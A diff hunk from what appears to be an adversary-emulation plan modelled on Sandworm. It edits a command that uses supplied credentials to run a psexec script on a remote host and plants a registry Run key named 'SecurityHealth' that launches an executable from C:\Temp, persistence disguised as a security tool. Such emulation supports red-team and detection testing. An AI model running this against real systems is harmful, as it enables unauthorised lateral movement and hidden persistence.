@@ -458,7 +458,7 @@
       sh:
         timeout: 120
         command: |
-          ./psexec_sandworm.py -service-name "Windows Check AV" #{domain}/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\Temp "C:\Users\#{second_host.user.name}\NTUSER.DAT" & reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "cmd /C start /D C:\Temp C:\Temp\wsmprovav.exe"' 2>&1
+          ./psexec_sandworm.py -service-name "Windows Check AV" #{domain}/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\Temp "C:\Users\#{second_host.user.name}\NTUSER.DAT" & reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "\"cmd /C start /D C:\Temp C:\Temp\wsmprovav.exe\""' 2>&1
         payloads:
           - psexec_sandworm.py
 
